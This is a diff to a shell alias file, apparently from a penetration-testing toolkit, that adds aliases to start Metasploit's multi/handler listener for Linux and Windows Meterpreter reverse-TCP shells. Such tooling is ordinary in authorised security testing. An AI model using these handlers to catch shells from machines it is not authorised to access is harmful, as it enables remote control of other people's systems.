@@ -8,3 +8,25 @@ msfdb_func() {
     sudo -u postgres sh -c "BUNDLE_GEMFILE=/opt/tools/metasploit-framework/Gemfile /usr/local/rvm/gems/ruby-3.1.5@metasploit-framework/wrappers/bundle exec /opt/tools/metasploit-framework/msfdb $@"
 }
 alias msfdb='msfdb_func'
+__meterpreter_handler_helper() {
+    local PAYLOAD="$1"
+    local NAME="$2"
+    local LHOST="$3"
+    local LPORT="$4"
+
+    if [ -z "$LHOST" ] || [ -z "$LPORT" ]; then
+        echo "Usage: $NAME <LHOST> <LPORT>"
+        return 1
+    fi
+
+    msfconsole -x "
+        use exploit/multi/handler;
+        set PAYLOAD $PAYLOAD;
+        set LHOST $LHOST;
+        set LPORT $LPORT;
+        set ExitOnSession false;
+        exploit -j;
+    "
+}
+alias meterpreter_handler_linux='__meterpreter_handler_helper linux/x86/meterpreter/reverse_tcp meterpreter_linux'
+alias meterpreter_handler_windows='__meterpreter_handler_helper windows/meterpreter/reverse_tcp meterpreter_windows'
